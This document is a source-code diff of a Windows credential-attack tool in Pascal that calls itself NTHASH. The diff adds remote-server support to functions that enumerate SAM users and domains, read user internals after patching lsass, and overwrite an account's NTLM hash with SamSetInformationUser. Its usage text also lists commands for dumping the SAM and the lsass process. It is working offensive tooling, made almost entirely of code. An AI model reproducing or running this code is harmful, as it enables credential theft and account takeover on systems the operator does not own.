@@ -15,15 +15,11 @@ pdomainuser=^tdomainuser;
 var
   lsass_pid:dword=0;
   p:dword;
-  pid,hash,mysid,server,user,oldhash,newhash,oldpwd,newpwd:string;
+  pid,hash,server,user,oldhash,newhash,oldpwd,newpwd:string;
   oldhashbyte,newhashbyte:tbyte16;
   myPsid:PSID;
   mystringsid:pchar;
   winver,osarch:string;
-
-
-
-
 
 
   procedure CreateFromStr (var value:_LSA_UNICODE_STRING; st : string);
@@ -81,7 +77,7 @@ DomainSID_.SubAuthority[0] :=SECURITY_BUILTIN_DOMAIN_RID;
 //lets go for the local DB
 //domain sid=user sid minus RID
 //lets get PUSERSID
-GetAccountSid2('',widestring(user),pusersid);
+GetAccountSid2(server,widestring(user),pusersid);
 if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
    begin
    log('user:'+StringSid );
@@ -253,7 +249,7 @@ result:=status=0;
 end;
 log('***************************************');
 //
-ReallocMem (ustr_server.Buffer, 0);
+//ReallocMem (ustr_server.Buffer, 0);
 if UserHandle_ <>thandle(-1) then status:=SamCloseHandle(UserHandle_);
 if Status <> 0 then
    begin log('SamCloseHandle failed:'+inttostr(status));exit;end
@@ -344,7 +340,7 @@ if (Status <> 0) and (status<>$00000105) then
    else log ('SamEnumerateDomainsInSamServer ok');
 if (status=0) or (status=$00000105) then
    begin
-   log('count='+inttostr(count));
+   log('count='+inttostr(count),1);
    ptr:=buffer;
    for i:=1 to count do
        begin
@@ -357,27 +353,28 @@ if (status=0) or (status=$00000105) then
    SamFreeMemory(buffer);
    end;
 //
-ReallocMem (ustr_server.Buffer, 0);
+//ReallocMem (ustr_server.Buffer, 0);
 if UserHandle_ <>thandle(-1) then status:=SamCloseHandle(UserHandle_);
 if Status <> 0 then
-   begin log('SamCloseHandle failed:'+inttostr(status),status);exit;end
+   begin log('SamCloseHandle failed:'+inttostr(status),status);;end
    else log ('SamCloseHandle ok',status);
 
 if DomainHandle_<>thandle(-1) then status:=SamCloseHandle(DomainHandle_);
 if Status <> 0 then
-   begin log('SamCloseHandle failed:'+inttostr(status),status);exit;end
+   begin log('SamCloseHandle failed:'+inttostr(status),status);;end
    else log('SamCloseHandle ok',status);
 
 if samhandle_<>thandle(-1) then status:=SamCloseHandle(samhandle_ );
 if Status <> 0 then
-     begin log('SamCloseHandle failed:'+inttostr(status),status);exit;end
+     begin log('SamCloseHandle failed:'+inttostr(status),status);;end
      else log('SamCloseHandle ok',status);
 end;
 
 
-function QueryUsers(_domain:pchar;func:pointer =nil):boolean;
+function QueryUsers(server,_domain:pchar;func:pointer =nil):boolean;
 type fn=function(param:pointer):dword;stdcall;
 var
+ustr_server : _LSA_UNICODE_STRING;
 samhandle_:thandle=thandle(-1);
 domainhandle_:thandle=thandle(-1);
 UserHandle_:thandle=thandle(-1);
@@ -397,6 +394,12 @@ unicode_domain:_LSA_UNICODE_STRING;
 begin
 result:=false;
 //
+if server<>''  then
+   begin
+   CreateFromStr (ustr_server,server);
+   Status := SamConnect2(@ustr_server, SamHandle_, MAXIMUM_ALLOWED, false);
+   end
+else
 Status := SamConnect(nil, @samhandle_ , MAXIMUM_ALLOWED {0x000F003F}, false);
 if Status <> 0 then
    begin log('SamConnect failed:'+inttohex(status,8),status);;end
@@ -468,6 +471,7 @@ if (Status <> 0) and (status<>$00000105) then
       SamFreeMemory(buffer)
       end;
 //
+//if buffer<>nil then ReallocMem (ustr_server.Buffer, 0);
 if UserHandle_ <>thandle(-1) then status:=SamCloseHandle(UserHandle_);
 if Status <> 0 then
    begin log('SamCloseHandle failed:'+inttostr(status),status);exit;end
@@ -488,8 +492,9 @@ end;
 //this function can only called if lsass is "patched"
 //SamQueryInformationUser + UserInternal1Information=0x12
 //or else you get //c0000003 (STATUS_INVALID_INFO_CLASS)
-function QueryInfoUser(user:string):boolean;
+function QueryInfoUser(server,user:string):boolean;
 var
+ustr_server : _LSA_UNICODE_STRING;
 samhandle_:thandle=thandle(-1);
 domainhandle_:thandle=thandle(-1);
 UserHandle_:thandle=thandle(-1);
@@ -502,7 +507,7 @@ userinfo:PSAMPR_USER_INTERNAL1_INFORMATION;
 begin
 result:=false;
 //
-GetAccountSid2('',widestring(user),pusersid);
+GetAccountSid2(server,widestring(user),pusersid);
 if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
    begin
    log('user:'+StringSid,1 );
@@ -511,10 +516,16 @@ if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
    end
    else
    begin
-     log('something wrong with user account...');
+     log('something wrong with user account...',1);
      exit;
    end;
 //
+if server<>''  then
+   begin
+   CreateFromStr (ustr_server,server);
+   Status := SamConnect2(@ustr_server, SamHandle_, MAXIMUM_ALLOWED, false);
+   end
+else
 Status := SamConnect(nil, @samhandle_ , MAXIMUM_ALLOWED {0x000F003F}, false);
 if Status <> 0 then
    begin log('SamConnect failed:'+inttohex(status,8));;end
@@ -546,6 +557,7 @@ if status=0 then
    SamFreeMemory(userinfo);
    end;
 //
+//ReallocMem (ustr_server.Buffer, 0);
 if UserHandle_ <>thandle(-1) then status:=SamCloseHandle(UserHandle_);
 if Status <> 0 then
    begin log('SamCloseHandle failed:'+inttostr(status));exit;end
@@ -562,8 +574,9 @@ if Status <> 0 then
      else log('SamCloseHandle ok');
 end;
 
-function SetInfoUser(user:string;hash:tbyte16):boolean;
+function SetInfoUser(server,user:string;hash:tbyte16):boolean;
 var
+ustr_server : _LSA_UNICODE_STRING;
 samhandle_:thandle=thandle(-1);
 domainhandle_:thandle=thandle(-1);
 UserHandle_:thandle=thandle(-1);
@@ -576,7 +589,7 @@ userinfo:PSAMPR_USER_INTERNAL1_INFORMATION;
 begin
 result:=false;
 //
-GetAccountSid2('',widestring(user),pusersid);
+GetAccountSid2(server,widestring(user),pusersid);
 if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
    begin
    log('user:'+StringSid,1 );
@@ -585,18 +598,24 @@ if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
    end
    else
    begin
-     log('something wrong with user account...');
+     log('something wrong with user account...',1);
      exit;
    end;
 //
+if server<>''  then
+   begin
+   CreateFromStr (ustr_server,server);
+   Status := SamConnect2(@ustr_server, SamHandle_, MAXIMUM_ALLOWED, false);
+   end
+else
 Status := SamConnect(nil, @samhandle_ , MAXIMUM_ALLOWED {0x000F003F}, false);
 if Status <> 0 then
-   begin log('SamConnect failed:'+inttohex(status,8));;end
-   else log ('SamConnect ok');
+   begin log('SamConnect failed:'+inttohex(status,8),status);;end
+   else log ('SamConnect ok',status);
 //
 if  ConvertStringSidToSid(pchar(domain),PDOMAINSID )=false
-   then log('ConvertStringSidToSid failed' )
-   else log ('ConvertStringSidToSid ok');
+   then log('ConvertStringSidToSid failed',status )
+   else log ('ConvertStringSidToSid ok',status);
 //
 Status := SamOpenDomain(samhandle_ , {$705}MAXIMUM_ALLOWED, PDomainSID, @DomainHandle_);
 if Status <> 0 then
@@ -605,8 +624,8 @@ if Status <> 0 then
 //
 Status := SamOpenUser(DomainHandle_ , MAXIMUM_ALLOWED , rid , @UserHandle_);
 if Status <> 0 then
-   begin log('SamOpenUser failed:'+inttohex(status,8));;end
-   else log('SamOpenUser ok');
+   begin log('SamOpenUser failed:'+inttohex(status,8),status);;end
+   else log('SamOpenUser ok',status);
 //
 {
 status:=SamQueryInformationUser(UserHandle_ ,$12,userinfo);
@@ -622,27 +641,28 @@ userinfo^.EncryptedNtOwfPassword :=tbyte16_(hash);
 
 status:=SamSetInformationUser(UserHandle_ ,$12,userinfo);
 if Status <> 0 then
-   begin log('SamSetInformationUser failed:'+inttohex(status,8));;end
-   else log('SamSetInformationUser ok');
+   begin log('SamSetInformationUser failed:'+inttohex(status,8),status);;end
+   else log('SamSetInformationUser ok',status);
 if status=0 then
    begin
    result:=true;
    end;
 //
+//ReallocMem (ustr_server.Buffer, 0);
 if UserHandle_ <>thandle(-1) then status:=SamCloseHandle(UserHandle_);
 if Status <> 0 then
-   begin log('SamCloseHandle failed:'+inttostr(status));exit;end
-   else log ('SamCloseHandle ok');
+   begin log('SamCloseHandle failed:'+inttostr(status),status);;end
+   else log ('SamCloseHandle ok',status);
 
 if DomainHandle_<>thandle(-1) then status:=SamCloseHandle(DomainHandle_);
 if Status <> 0 then
-   begin log('SamCloseHandle failed:'+inttostr(status));exit;end
-   else log('SamCloseHandle ok');
+   begin log('SamCloseHandle failed:'+inttostr(status),status);;end
+   else log('SamCloseHandle ok',status);
 
 if samhandle_<>thandle(-1) then status:=SamCloseHandle(samhandle_ );
 if Status <> 0 then
-     begin log('SamCloseHandle failed:'+inttostr(status));exit;end
-     else log('SamCloseHandle ok');
+     begin log('SamCloseHandle failed:'+inttostr(status),status);;end
+     else log('SamCloseHandle ok',status);
 end;
 
 //**********************************************************************
@@ -782,7 +802,7 @@ begin
                                         begin
                                         log('patch ok',0);
                                         log('***************************************',0);
-                                        if QueryUsers ('',@callback_users )=true
+                                        if QueryUsers ('','',@callback_users )=true
                                         //if QueryInfoUser (user)=true
                                            then log('SamQueryInformationUser OK',0)
                                            else log('SamQueryInformationUser NOT OK',1);
@@ -813,7 +833,7 @@ end;
 
 
 begin
-  log('changentlm 1.0 by erwan2212@gmail.com',1);
+  log('NTHASH 1.0 by erwan2212@gmail.com',1);
   winver:=GetWindowsVer;
   osarch:=getenv('PROCESSOR_ARCHITECTURE');
   log('Windows Version:'+winver,1);
@@ -829,15 +849,19 @@ begin
   log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newhash:xxx',1);
   log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newhash:xxx',1);
   log('NTHASH /gethash:password',1);
-  log('NTHASH /getsid:username [/server:hostname]',1);
+  log('NTHASH /getsid /user:username [/server:hostname]',1);
   log('NTHASH /getusers [/server:hostname]',1);
   log('NTHASH /getdomains [/server:hostname]',1);
   log('NTHASH /dumpsam',1);
   log('NTHASH /dumpprocess:pid',1);
+  log('NTHASH /a_command /verbose',1);
   end;
   //
   //exit;
   //
+  p:=pos('/verbose',cmdline);
+  if p>0 then verbose:=true;
+
   p:=pos('/dumpprocess:',cmdline);
   if p>0 then
      begin
@@ -850,9 +874,6 @@ begin
   p:=pos('/dumpsam',cmdline);
   if p>0 then
      begin
-     user:=copy(cmdline,p,255);
-     user:=stringreplace(user,'/dumpsam','',[rfReplaceAll, rfIgnoreCase]);
-     delete(user,pos(' ',user),255);
      dumpsam (lsass_pid ,'');
      exit;
      end;
@@ -873,10 +894,18 @@ begin
        delete(server,pos(' ',server),255);
        //log(server);
        end;
+  p:=pos('/user:',cmdline);
+    if p>0 then
+         begin
+         user:=copy(cmdline,p,255);
+         user:=stringreplace(user,'/user:','',[rfReplaceAll, rfIgnoreCase]);
+         delete(user,pos(' ',user),255);
+         //log(user);
+         end;
   p:=pos('/getusers',cmdline);  //temporary
   if p>0 then
        begin
-       QueryUsers (pchar(server),nil );
+       QueryUsers (pchar(server),'',nil );
        exit;
        end;
   p:=pos('/getdomains',cmdline);  //temporary
@@ -885,25 +914,13 @@ begin
        QueryDomains (pchar(server),nil );
        exit;
        end;
-  p:=pos('/getsid:',cmdline);
+  p:=pos('/getsid',cmdline);
   if p>0 then
        begin
-       mysid:=copy(cmdline,p,255);
-       mysid:=stringreplace(mysid,'/getsid:','',[rfReplaceAll, rfIgnoreCase]);
-       delete(mysid,pos(' ',mysid),255);
-       //log(server);
-       GetAccountSid2(server,mysid,mypsid);
+       GetAccountSid2(widestring(server),widestring(user),mypsid);
        ConvertSidToStringSid (mypsid,mystringsid);
        log(mystringsid,1);
        exit;
-       end;
-  p:=pos('/user:',cmdline);
-  if p>0 then
-       begin
-       user:=copy(cmdline,p,255);
-       user:=stringreplace(user,'/user:','',[rfReplaceAll, rfIgnoreCase]);
-       delete(user,pos(' ',user),255);
-       //log(user);
        end;
   p:=pos('/oldhash:',cmdline);
   if p>0 then
@@ -941,8 +958,8 @@ begin
   if p>0 then
        begin
        if newhash<>'' then newhashbyte :=HashStringToByte (newhash);
-       if SetInfoUser (user, HashStringToByte (newhash))
-          then log('Done',0)
+       if SetInfoUser ('',user, HashStringToByte (newhash))
+          then log('Done',1)
           else log('Failed',1);
        end;
   p:=pos('/changentlm',cmdline);
@@ -953,7 +970,7 @@ begin
        if oldhash<>'' then oldhashbyte :=HashStringToByte (oldhash);
        if newhash<>'' then newhashbyte :=HashStringToByte (newhash);
        if _ChangeNTLM(server,user,oldhashbyte ,newhashbyte)
-          then log('Done',0)
+          then log('Done',1)
           else log('Failed',1);
        end;
 //
